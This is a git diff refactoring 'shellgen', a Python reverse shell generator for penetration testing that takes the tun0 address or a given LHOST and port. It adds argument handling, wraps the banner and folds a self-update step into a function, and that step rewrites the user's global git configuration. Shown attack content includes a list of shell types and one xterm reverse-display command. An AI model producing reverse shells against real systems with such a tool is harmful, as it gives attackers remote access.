@@ -16,9 +16,6 @@ class bcolors:
 	RED = '\033[91m'
 	ENDC = "\033[1;m"
 
-# force https for git
-def git_https_force():
-	subprocess.Popen('git config --global url."https://github.com/".insteadOf git@github.com:;git config --global url."https://".insteadOf git://', shell=True).wait()
 
 def print_info(message):
     print((bcolors.RED) + ("[*] ") + (bcolors.YELLOW) + (str(message)))
@@ -26,35 +23,44 @@ def print_info(message):
 def print_shell(message):
     print((bcolors.DARKGREEN) + ("[*] ") + (bcolors.RED) + (str(message)) + (bcolors.ENDC))
 
-# force https
-git_https_force()
+def print_error(message):
+    print((bcolors.DARKGREEN) + ("[*] ") + (bcolors.RED) + (str(message)) + (bcolors.ENDC))
 
-# try to update ourself first
-print_info("Trying to update myself first... Then will generate the shellcode...")
-subprocess.Popen("git pull", shell=True).wait()
+def update():
+	# force https for git
+	def git_https_force():
+		subprocess.Popen('git config --global url."https://github.com/".insteadOf git@github.com:;git config --global url."https://".insteadOf git://', shell=True).wait()
+
+	# force https
+	git_https_force()
+
+	# try to update ourself first
+	print_info("Trying to update myself first... Then will generate the shellcode...")
+	subprocess.Popen("git pull", shell=True).wait()
 
 
-__version__ = 0.2
+def banner():
+	__version__ = 0.3
 
-banner = bcolors.DARKGREEN + """
-███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
-██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
-███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
-╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
-███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
-╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
-""" +bcolors.ENDC
-banner += """
-Version: """ + bcolors.YELLOW + str(__version__) + bcolors.DARKGREEN + """\n
-Author: AgentWhite (@_agentwhite) (github.com/realagentwhite)"""
-banner += """
-Reverse shell generator based on examples pulled from:
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
-This is uses the tun0 IPv4 address. Enter a specific port after calling the script
-
-USAGE: ./shellgen.py <port>
-""" + bcolors.ENDC
+	banner = bcolors.DARKGREEN + """
+	███████╗██╗  ██╗███████╗██╗     ██╗      ██████╗ ███████╗███╗   ██╗
+	██╔════╝██║  ██║██╔════╝██║     ██║     ██╔════╝ ██╔════╝████╗  ██║
+	███████╗███████║█████╗  ██║     ██║     ██║  ███╗█████╗  ██╔██╗ ██║
+	╚════██║██╔══██║██╔══╝  ██║     ██║     ██║   ██║██╔══╝  ██║╚██╗██║
+	███████║██║  ██║███████╗███████╗███████╗╚██████╔╝███████╗██║ ╚████║
+	╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝
+	""" +bcolors.ENDC
+	banner += """
+	Version: """ + bcolors.YELLOW + str(__version__) + bcolors.DARKGREEN + """\n
+	Author: AgentWhite (@_agentwhite) (github.com/realagentwhite)"""
+	banner += """
+	Reverse shell generator based on examples pulled from:
+	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+	http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+	This is uses the tun0 IPv4 address. Enter a specific port after calling the script
+	""" + bcolors.ENDC
+	
+	return banner
 
 def return_shells(shell, ip, port):
 	if shell == "all":
@@ -170,21 +176,12 @@ def return_shells(shell, ip, port):
 			xterm = """xterm -display """+ip+""":"""+port
 			print(xterm)
 
-shells = ["shell","go","nc","netcat","msfvenom","perl","php","python","powershell","ruby","xterm"]
-
-os.system("clear")
-print(banner)
-
-if len(sys.argv) != 2:
-	print("Usage: %s <port>" % str(sys.argv[0]))
-elif len(sys.argv[1]) > 5:
-	print_info("There is a max of ports up to 65535")
-	print_info("You entered %s"%sys.argv[1])
-	sys.exit()
-else:
+def main():
 	try:
-		ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
-		port = sys.argv[1]
+		update()
+		
+		shells = ["shell","go","nc","netcat","msfvenom","perl","php","python","powershell","ruby","xterm"]
+		
 		print(bcolors.DARKGREEN + "[*]tun0 IP: " + ip + " port: " + port + bcolors.ENDC)
 
 		print_info("Shell types:")
@@ -201,6 +198,39 @@ else:
 		print_shell("Exiting...now")
 		sys.exit()
 
+
+def only_port_passed():
+	global ip, port
+	try:
+		ip = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
+		port = sys.argv[1]
+		main()
 	except IndexError:
-		print("\nCheck that you are connected to the VPN")
+		print_error("Check that you are connected to the VPN\n")
 		sys.exit()
+
+
+if __name__ == "__main__":
+	os.system("clear")
+	print(banner())
+	print(len(sys.argv))
+
+	if len(sys.argv) == 1:
+		print_info("Usage: %s <LHOST> <LPORT>" % str(sys.argv[0]))
+
+	elif len(sys.argv[-1]) > 5:
+		print_info("There is a max of ports up to 65535")
+		print_info("You entered %s"%sys.argv[1])
+		sys.exit()
+	elif len(sys.argv) == 3:
+		ip = sys.argv[1]
+		port = sys.argv[2]
+		main()
+	elif len(sys.argv) == 2:
+		if '.' in sys.argv[-1]:
+			print_error("You forgot to add the port wich goes last in the arguments.") 
+			sys.exit()
+		else:
+			only_port_passed()
+	else:
+		only_port_passed()
